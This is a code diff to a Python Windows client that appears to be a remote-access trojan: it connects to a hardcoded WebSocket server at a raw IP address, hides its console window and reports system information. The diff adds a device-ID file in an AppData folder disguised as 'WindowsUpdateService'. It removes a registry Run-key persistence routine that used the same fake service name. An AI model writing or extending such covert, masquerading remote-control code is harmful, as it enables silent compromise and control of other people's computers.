@@ -7,23 +7,33 @@ import platform
 import uuid
 import threading
 import ctypes
-import winreg
 import subprocess
 
 SERVER_URL = "ws://118.178.170.93:3000"
-DEVICE_ID = str(uuid.uuid4())[:8]
+DATA_DIR = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'WindowsUpdateService')
+
+def get_device_id():
+    id_file = os.path.join(DATA_DIR, 'device_id.txt')
+    try:
+        if os.path.exists(id_file):
+            with open(id_file, 'r') as f:
+                return f.read().strip()
+    except:
+        pass
+    
+    os.makedirs(DATA_DIR, exist_ok=True)
+    new_id = str(uuid.uuid4())[:8]
+    try:
+        with open(id_file, 'w') as f:
+            f.write(new_id)
+    except:
+        pass
+    return new_id
+
+DEVICE_ID = get_device_id()
 
 def hide_console():
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
-def add_to_startup():
-    try:
-        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{exe_path}"')
-        winreg.CloseKey(key)
-    except:
-        pass
 
 def get_system_info():
     return {
@@ -108,5 +118,4 @@ def connect():
 
 if __name__ == "__main__":
     hide_console()
-    add_to_startup()
     connect()
